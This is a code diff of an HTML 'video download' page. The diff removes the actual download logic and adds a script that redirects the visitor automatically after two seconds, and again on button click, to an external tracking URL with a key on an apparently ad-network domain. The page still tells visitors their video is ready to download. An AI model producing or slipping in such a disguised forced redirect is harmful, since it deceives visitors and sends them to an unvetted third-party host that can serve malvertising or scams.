@@ -47,7 +47,7 @@ h1{
 p{
     color:#666;
     line-height:1.6;
-    margin-bottom:30px;
+    margin-bottom:20px;
 }
 
 button{
@@ -60,7 +60,6 @@ button{
     font-weight:bold;
     border-radius:10px;
     cursor:pointer;
-    transition:0.3s;
 }
 
 button:hover{
@@ -75,6 +74,7 @@ button:hover{
 </style>
 
 </head>
+
 <body>
 
 <div class="container">
@@ -85,48 +85,59 @@ button:hover{
 
     <p>
         Your video is ready to download.
-        Click the button below to start downloading instantly.
+        Redirecting automatically...
     </p>
 
     <button id="downloadBtn">
         📥 Click Here to Download Video
     </button>
 
-    <div class="message" id="message"></div>
+    <div class="message" id="message">
+        Redirecting in <span id="timer">2</span> seconds...
+    </div>
 
 </div>
 
+
 <script>
+
 const btn = document.getElementById("downloadBtn");
 const message = document.getElementById("message");
+const timer = document.getElementById("timer");
 
+
+// Button URL
+const redirectURL = "https://daubwhereupon.com/ztt69euwns?key=eb07c0cee12be5cd4f220675d0d1b9ea";
+
+
+// 2 Second Auto Redirect
+let seconds = 2;
+
+let countdown = setInterval(function(){
+
+    seconds--;
+
+    timer.innerHTML = seconds;
+
+    if(seconds <= 0){
+
+        clearInterval(countdown);
+
+        window.location.href = redirectURL;
+
+    }
+
+},1000);
+
+
+// Button click redirect
 btn.addEventListener("click", function(){
 
-    btn.disabled = true;
-    btn.innerHTML = "Preparing Download...";
-
-    setTimeout(function(){
-
-        const link = document.createElement("a");
-
-        // Replace this with your video URL
-        link.href = "your-video.mp4";
-
-        // Optional download filename
-        link.download = "https://daubwhereupon.com/ztt69euwns?key=eb07c0cee12be5cd4f220675d0d1b9ea";
-
-        document.body.appendChild(link);
-        link.click();
-        document.body.removeChild(link);
-
-        message.innerHTML = "✅ Download Started Successfully!";
-
-        btn.disabled = false;
-        btn.innerHTML = "📥 Click Here to Download Video";
-
-    },1500);
+    window.location.href = redirectURL;
 
 });
+
+
 </script>
 
 </body>
